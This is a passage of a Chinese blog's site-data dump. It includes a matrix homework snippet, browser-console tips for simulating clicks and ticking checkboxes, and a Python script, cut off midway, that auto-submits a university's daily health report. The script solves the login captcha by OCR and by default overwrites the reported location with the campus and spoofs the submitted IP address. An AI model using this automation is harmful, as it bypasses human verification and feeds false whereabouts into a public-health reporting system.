ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":397,"excerpt":"<h1 id=\"矩阵\"><a href=\"#矩阵\" class=\"headerlink\" title=\"矩阵\"></a>矩阵</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a[<span class=\"number\">10</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b[<span class=\"number\">10</span>][<span class=\"number\">10</span>],k=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">4</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;=i;j++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            b[i][j]=a[k];</span><br><span class=\"line\">            b[j][i]=a[k++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">4</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">4</span>;j++)</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;b[i][j]&lt;&lt;<span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"网页Console操作","date":"2019-03-29T09:11:09.000Z","abbrlink":"d97143a2","_content":"# 按钮点击事件模拟\n根据 `class` 属性\n```javascript\nvar e = document.createEvent(\"MouseEvents\");\ne.initEvent(\"click\", true, true);\ndocument.getElementsByClassName(\"class_id\")[0].dispatchEvent(e);\n```\n根据 `id` 属性\n```javascript\ndocument.getElementById(id).click();\n```\n\n# 批量勾选选框\n最直接的方法是抓取所有的输入，只过滤复选框，并设置checked属性。\n```javascript\nvar allInputs = document.getElementsByTagName(\"input\");\nfor (var i = 0, max = allInputs.length; i < max; i++){\n    if (allInputs[i].type === 'checkbox')\n        allInputs[i].checked = true;\n}\n```\n或以下两种方法进行全选。\n```javascript\n$(\"input[type='checkbox']\").prop(\"checked\", true);\n$(\":checkbox\").prop(\"checked\", true);\n```","source":"_posts/网页Console批量操作.md","raw":"---\ntitle: 网页Console操作\ndate: 2019-03-29 17:11:09\ncategories:\n  - Web\n  - Console\ntags:\n  - 脚本\nabbrlink: d97143a2\n---\n# 按钮点击事件模拟\n根据 `class` 属性\n```javascript\nvar e = document.createEvent(\"MouseEvents\");\ne.initEvent(\"click\", true, true);\ndocument.getElementsByClassName(\"class_id\")[0].dispatchEvent(e);\n```\n根据 `id` 属性\n```javascript\ndocument.getElementById(id).click();\n```\n\n# 批量勾选选框\n最直接的方法是抓取所有的输入，只过滤复选框，并设置checked属性。\n```javascript\nvar allInputs = document.getElementsByTagName(\"input\");\nfor (var i = 0, max = allInputs.length; i < max; i++){\n    if (allInputs[i].type === 'checkbox')\n        allInputs[i].checked = true;\n}\n```\n或以下两种方法进行全选。\n```javascript\n$(\"input[type='checkbox']\").prop(\"checked\", true);\n$(\":checkbox\").prop(\"checked\", true);\n```","slug":"网页Console批量操作","published":1,"updated":"2020-05-11T09:45:56.947Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkdy003qqse5guqph8qm","content":"<h1 id=\"按钮点击事件模拟\"><a href=\"#按钮点击事件模拟\" class=\"headerlink\" title=\"按钮点击事件模拟\"></a>按钮点击事件模拟</h1><p>根据 <code>class</code> 属性<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> e = <span class=\"built_in\">document</span>.createEvent(<span class=\"string\">&quot;MouseEvents&quot;</span>);</span><br><span class=\"line\">e.initEvent(<span class=\"string\">&quot;click&quot;</span>, <span class=\"literal\">true</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">&quot;class_id&quot;</span>)[<span class=\"number\">0</span>].dispatchEvent(e);</span><br></pre></td></tr></table></figure><br>根据 <code>id</code> 属性<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(id).click();</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"批量勾选选框\"><a href=\"#批量勾选选框\" class=\"headerlink\" title=\"批量勾选选框\"></a>批量勾选选框</h1><p>最直接的方法是抓取所有的输入，只过滤复选框，并设置checked属性。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> allInputs = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">&quot;input&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, max = allInputs.length; i &lt; max; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allInputs[i].type === <span class=\"string\">&#x27;checkbox&#x27;</span>)</span><br><span class=\"line\">        allInputs[i].checked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>或以下两种方法进行全选。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">&quot;input[type=&#x27;checkbox&#x27;]&quot;</span>).prop(<span class=\"string\">&quot;checked&quot;</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">$(<span class=\"string\">&quot;:checkbox&quot;</span>).prop(<span class=\"string\">&quot;checked&quot;</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":613,"excerpt":"","more":"<h1 id=\"按钮点击事件模拟\"><a href=\"#按钮点击事件模拟\" class=\"headerlink\" title=\"按钮点击事件模拟\"></a>按钮点击事件模拟</h1><p>根据 <code>class</code> 属性<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> e = <span class=\"built_in\">document</span>.createEvent(<span class=\"string\">&quot;MouseEvents&quot;</span>);</span><br><span class=\"line\">e.initEvent(<span class=\"string\">&quot;click&quot;</span>, <span class=\"literal\">true</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">&quot;class_id&quot;</span>)[<span class=\"number\">0</span>].dispatchEvent(e);</span><br></pre></td></tr></table></figure><br>根据 <code>id</code> 属性<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(id).click();</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"批量勾选选框\"><a href=\"#批量勾选选框\" class=\"headerlink\" title=\"批量勾选选框\"></a>批量勾选选框</h1><p>最直接的方法是抓取所有的输入，只过滤复选框，并设置checked属性。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> allInputs = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">&quot;input&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, max = allInputs.length; i &lt; max; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allInputs[i].type === <span class=\"string\">&#x27;checkbox&#x27;</span>)</span><br><span class=\"line\">        allInputs[i].checked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>或以下两种方法进行全选。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">&quot;input[type=&#x27;checkbox&#x27;]&quot;</span>).prop(<span class=\"string\">&quot;checked&quot;</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">$(<span class=\"string\">&quot;:checkbox&quot;</span>).prop(<span class=\"string\">&quot;checked&quot;</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure></p>\n"},{"title":"自动健康打卡","abbrlink":"934e7461","date":"2020-12-01T03:56:35.000Z","_content":"自动健康打卡(逃\n\n建议使用Coding定时构建，强烈不推荐使用国外服务器，包括github action。\n**因当天打卡系统异常造成无法打卡时，需等待打卡系统正常后自行打卡或手动触发构建计划。**\n\n**本文档以及代码可能会不定时更新，修复和优化，部署成功的能不能在下面留言告诉一下，且留意本文章是否更新，最后更新时间可以看最上方。**\n<!--more-->\n\n# 配置文件\n注意将config.ini配置项进行修改，申请AK和SK教程见后文。\n```ini config.ini\n[Basic]\n;是否更改健康打卡地址为学校\nCHANGE_DATA = True\n;是否修改IP地址\nCHANGE_ADDR = True\n;自定义IP地址\nIP_ADDR = 223.90.40.4\n\n[API]\n;百度智能云 文字识别OCR AK\nAPI_KEY = your_api_key\n;百度智能云 文字识别OCR SK\nSECRET_KEY = your_secret_key\n\n[User]\n;昵称: ['账号', '密码']\nsample_user: ['username', 'password']\n\n```\n添加用户信息，账号密码为[统一认证](https://uia.hpu.edu.cn)账号密码。\n如需多用户，可在`[User]`下按示例添加新行，注意都为英文符号，昵称随便起，可以为中文。\n\n上述AK以及SK需前往[百度智能云](https://console.bce.baidu.com/ai/#/ai/ocr/app/list)申请文字识别OCR API。\n点击创建应用，依次填写应用名称，文字识别包名为不需要，应用归属为个人，应用描述后，点击立即创建，返回应用列表，即可得到API Key和Secret Key。\n\n\n# 完整代码\n以下是完整代码main.py，无需更改，按之后步骤要求进行上传。\n\n```py main.py\n\"\"\"自动健康打卡\"\"\"\nfrom __future__ import absolute_import\nimport logging\nimport requests\nimport configparser\nimport re\nimport ast\nimport random\nimport time\nfrom bs4 import BeautifulSoup\nfrom retrying import retry\n\n# 固定链接，不建议修改\nURL_MAP = {\n    'HOST': 'https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start',\n    'START': 'https://ehall.hpu.edu.cn/infoplus/interface/start',\n    'ALIVE': 'https://ehall.hpu.edu.cn/infoplus/alive',\n    'CAPTCHA': 'https://uia.hpu.edu.cn/sso/apis/v2/open/captcha?date=',\n    'LOGIN': 'https://uia.hpu.edu.cn/cas/login',\n    'RENDER': 'https://ehall.hpu.edu.cn/infoplus/interface/render',\n    'PROCESS': 'https://ehall.hpu.edu.cn/infoplus/interface/instance/[id]/progress',\n    'NEXTSTEP': 'https://ehall.hpu.edu.cn/infoplus/interface/listNextStepsUsers',\n    'DOACTION': 'https://ehall.hpu.edu.cn/infoplus/interface/doAction',\n    'CHECK': 'https://ehall.hpu.edu.cn/taskcenter/api/me/processes/done?limit=1&start=0',\n    'API': 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=[ak]&client_secret=[sk]',\n    'REQUEST_URL': 'https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic'\n}\n\n# 请求头，可以按需更改\nHEADERS = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                  'Chrome/78.0.3904.108 Safari/537.36 QIHU 360EE'\n}\n\n\nclass ReadConfig:\n    \"\"\"读取配置文件类\"\"\"\n\n    def __init__(self, filename):\n        \"\"\"配置文件读取初始化\"\"\"\n        self.config = configparser.ConfigParser()\n        self.config['Basic'] = {\n            'CHANGE_DATA': True,\n            'CHANGE_ADDR': True,\n            'IP_ADDR': '223.90.40.4'\n        }\n        self.config.read(filename, encoding='utf-8')\n\n    def get_basic(self, param):\n        \"\"\"获取Basic配置\"\"\"\n        value = self.config.get('Basic', param)\n        return value\n\n    def get_api(self, param):\n        \"\"\"获取API配置\"\"\"\n        value = self.config.get('API', param)\n        return value\n\n    def get_user(self):\n        \"\"\"获取User配置\"\"\"\n        value = self.config.items('User')\n        return value\n\n\nclass Bot:\n    \"\"\"自动健康打卡类\"\"\"\n\n    def __init__(self, config_file):\n        \"\"\"打卡初始化\"\"\"\n        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        self.logger = logging.getLogger('AutoReport')\n        self.logger.info('程序启动中...')\n\n        # 读取配置文件\n        self.data = ReadConfig(config_file)\n        self.chdata = self.data.get_basic('CHANGE_DATA')\n        self.chaddr = self.data.get_basic('CHANGE_ADDR')\n        self.ipaddr = self.data.get_basic('IP_ADDR')\n\n        self.api_key = self.data.get_api('API_KEY')\n        self.secret_key = self.data.get_api('SECRET_KEY')\n\n        # 登录并打卡\n        for user in self.data.get_user():\n            self.sessions = requests.session()\n            self.login(user)\n            self.post()\n            self.sessions.close()\n\n    @retry(stop_max_attempt_number=3)\n    def login(self, user):\n        \"\"\"登录\"\"\"\n        self.logger.info('%s开始登录中...', user[0])\n\n        # 登录页面\n        req = self.sessions.get(URL_MAP['HOST'], headers=HEADERS)\n        req = self.sessions.get(req.url, headers=HEADERS)\n        soup = BeautifulSoup(req.content, features=\"html.parser\")\n        form = soup.find_all('input', class_='for-form')\n\n        # 验证码获取\n        captcha = URL_MAP['CAPTCHA'] + str(int(round(time.time() * 1000)))\n        req = self.sessions.get(captcha, headers=HEADERS)\n        img = ast.literal_eval(req.content.decode('utf-8'))['img']\n        self.logger.info('验证码获取成功!')\n\n        # 验证码识别\n        api = URL_MAP['API'].replace('[ak]', self.api_key).replace('[sk]', self.secret_key)\n        response = requests.get(api)\n        access_token = response.json()['access_token']\n        request_url = URL_MAP['REQUEST_URL'] + \"?access_token=\" + access_token\n        api_headers = {'content-type': 'application/x-www-form-urlencoded'}\n        response = requests.post(request_url, data={'image': img}, headers=api_headers)\n        captcha = response.json()['words_result'][0]['words']\n        captcha = str(captcha.replace('=?', '')).split('+')\n        captcha = sum(map(int, captcha))\n        self.logger.info('验证码识别成功!')\n\n        # 构造表单\n        token = ast.literal_eval(req.content.decode('utf-8'))['token']\n        account = ast.literal_eval(user[1])\n        formdata = {\n            'username': account[0],\n            'password': account[1],\n            '_eventId': 'submit',\n            'token': token\n        }\n        formdata.update({f['name']: f['value'] for f in form})\n        formdata.update({'captcha': captcha})\n\n        # 登录\n        req = self.sessions.post(URL_MAP['LOGIN'], headers=HEADERS, data=formdata)\n        soup = BeautifulSoup(req.content, features='html.parser')\n        errormes = soup.find('span', id='errormes')\n        if errormes:\n            self.logger.error(errormes['value'])\n            raise Exception(errormes['value'])\n\n        # 检测登录状态\n        url = self.sessions.get(URL_MAP['HOST'], headers=HEADERS).url\n        if not url == URL_MAP['HOST']:\n            self.logger.error('登录失败, 未知错误!')\n            raise Exception('登录失败, 未知错误!')\n        else:\n            self.logger.info('使用账号密码登录成功!')\n\n    @retry(stop_max_attempt_number=3)\n    def post(self):\n        \"\"\"打卡\"\"\"\n        self.logger.info('打卡进行中...')\n        req = self.sessions.get(URL_MAP['HOST'], headers=HEADERS)\n        soup = BeautifulSoup(req.content, features='html.parser')\n\n        # 构造表单\n        csrf = soup.find('meta', itemscope='csrfToken')['content']\n        formdata = {\n            'idc': 'XSMRJKSB',\n            'release': '',\n            'csrfToken': csrf,\n            'formData': '{\"_VAR_URL\":\"https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start\",\"_VAR_URL_Attr\":\"{}\"}'\n        }\n        req = self.sessions.post(URL_MAP['START'], headers=HEADERS, data=formdata)\n        url = req.json()['entities'][0]\n\n        # 构造表单\n        stepid = int(re.findall(r'\\d+', url)[0])\n        self.logger.info('开始流程%s中...', stepid)\n        formdata = {\n            'stepId': stepid,\n            'instanceId': '',\n            'admin': 'false',\n            'rand': random.random() * 999,\n            'width': '1747',\n            'lang': 'zh',\n            'csrfToken': csrf\n        }\n        HEADERS.update({'Referer': url})\n        req = self.sessions.post(URL_MAP['RENDER'], headers=HEADERS, data=formdata)\n        self.logger.info('已加载审批表!')\n        form = req.json()['entities'][0]\n\n        # 构造表单\n        instanceid = form['step']['instanceId']\n        formdata = {\n            'stepId': stepid,\n            'includingTop': 'true',\n            'csrfToken': csrf,\n            'lang': 'zh'\n        }\n        req = self.sessions.post(URL_MAP['PROCESS'].replace('[id]', instanceid), headers=HEADERS, data=formdata)\n        self.logger.info('审批表处理中...')\n        timestamp = req.json()['entities'][0]['remarks'][0]['assignTime']\n        boundfields = ','.join(list(form['data'].keys()))\n\n        # 构造表单\n        postdata = form['data']\n        if self.chdata:\n            fixdata = {\n                'fieldTXcs': '410800',\n                'fieldTXcs_Name': '焦作市',\n                'fieldTXdq': '410811',\n                'fieldTXdq_Name': '山阳区',\n                'fieldTXjtwz': '河南理工大学'\n            }\n            postdata.update(fixdata)\n        if self.chaddr:\n            postdata.update({'_VAR_ADDR': self.ipaddr})\n        formdata = {\n            'stepId': stepid,\n            'actionId': 1,\n            'formData': str(postdata),\n            'timestamp': timestamp,\n            'rand': random.random() * 999,\n            'boundFields': boundfields,\n            'csrfToken': csrf,\n            'lang': 'zh'\n        }\n        req = self.sessions.post(URL_MAP['NEXTSTEP'], headers=HEADERS, data=formdata)\n        if req.json()['ecode'] == 'SUCCEED':\n            self.logger.info('健康打卡准备阶段, 成功!')\n        else:\n            raise Exception('健康打卡准备阶段, 失败!')\n\n        # 构造表单\n        formdata = {\n            'actionId': 1,\n            'formData': str(form['data']),\n            'remark': '',\n            'rand': random.random() * 999,\n            'nextUsers': '{}',\n            'stepId': stepid,\n            'timestamp': timestamp,\n            'boundFields': boundfields,\n            'csrfToken': csrf,\n            'lang': 'zh'\n        }\n        req = self.sessions.post(URL_MAP['DOACTION'], headers=HEADERS, data=formdata)\n        if req.json()['ecode'] == 'SUCCEED':\n            